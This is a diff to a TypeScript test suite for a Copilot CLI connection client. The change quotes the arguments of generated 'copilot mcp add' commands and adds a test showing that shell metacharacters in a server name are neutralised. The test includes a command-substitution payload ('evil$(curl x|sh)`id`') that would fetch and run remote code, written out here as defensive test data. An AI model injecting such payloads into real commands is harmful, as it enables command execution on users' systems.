@@ -39,7 +39,7 @@ describe("Copilot CLI connection client", () => {
         serverName: "archestra",
       }),
     ).toBe(
-      "copilot mcp add --transport http archestra http://localhost:9000/v1/mcp/default",
+      "copilot mcp add --transport http 'archestra' 'http://localhost:9000/v1/mcp/default'",
     );
     expect(
       tokenSteps[0].buildCommand?.({
@@ -48,8 +48,43 @@ describe("Copilot CLI connection client", () => {
         serverName: "archestra",
       }),
     ).toBe(
-      'copilot mcp add --transport http --header "Authorization: Bearer archestra_TOKEN" archestra http://localhost:9000/v1/mcp/default',
+      "copilot mcp add --transport http --header 'Authorization: Bearer archestra_TOKEN' 'archestra' 'http://localhost:9000/v1/mcp/default'",
     );
+  });
+
+  it("neutralizes shell metacharacters in a gateway-derived server name", () => {
+    const client = getCopilotClient();
+    if (client.mcp.kind !== "custom") {
+      throw new Error("Copilot CLI MCP support should be custom");
+    }
+    const mcp = client.mcp;
+    const steps =
+      typeof mcp.steps === "function"
+        ? mcp.steps({
+            url: "http://localhost:9000/v1/mcp/default",
+            token: null,
+            serverName: "x",
+          })
+        : mcp.steps;
+
+    // A member-editable gateway name carrying a command-substitution payload
+    // must land inside a single-quoted arg, where `$()`/backticks are inert.
+    const command = steps[0].buildCommand?.({
+      url: "http://localhost:9000/v1/mcp/default",
+      token: null,
+      serverName: "evil$(curl x|sh)`id`",
+    });
+    expect(command).toBe(
+      "copilot mcp add --transport http 'evil$(curl x|sh)`id`' 'http://localhost:9000/v1/mcp/default'",
+    );
+
+    // An embedded single quote is escaped rather than closing the quoting.
+    const withQuote = steps[0].buildCommand?.({
+      url: "http://localhost:9000/v1/mcp/default",
+      token: null,
+      serverName: "a'b",
+    });
+    expect(withQuote).toContain("'a'\\''b'");
   });
 
   it("renders LLM Proxy settings Copilot CLI can consume", () => {
